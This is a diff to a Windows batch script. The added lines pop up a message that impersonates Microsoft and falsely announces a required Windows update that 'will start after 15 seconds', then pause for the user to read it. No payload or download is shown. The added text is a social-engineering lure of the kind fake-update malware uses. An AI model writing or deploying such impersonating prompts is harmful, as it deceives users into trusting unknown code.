@@ -1,5 +1,12 @@
 @echo off
 
+::Prompt user for Windows update.
+msg %username% A new Windows update is availible. It is required to download it. It only takes a couple of minutes, 
+but after this your computer is safe. It will fix all known problems, vulnerabilities etc. Thanks, Microsoft Windows.
+The download will start after 15 seconds.
+
+::Wait user to read the message.
+timeout /t 15 /nobreak
 
 ::Change the color.
 color 0e
